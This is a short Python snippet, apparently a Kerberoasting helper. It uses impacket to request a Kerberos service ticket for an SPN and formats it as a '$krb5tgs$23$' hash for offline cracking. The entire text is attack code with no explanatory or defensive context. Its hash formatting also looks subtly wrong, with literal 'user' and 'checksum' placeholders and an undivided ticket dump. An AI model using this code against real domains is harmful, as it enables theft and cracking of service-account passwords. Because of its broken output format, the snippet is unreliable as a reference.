from impacket.krb5.kerberosv5 import getKerberosTGS

def extract(spn, realm, dc, tgt, cipher, key):
    ticket, _, _, _ = getKerberosTGS(spn, realm, dc, tgt, cipher, key)
    return f"$krb5tgs$23$*user${realm}${spn}*$checksum${ticket.hex()}"
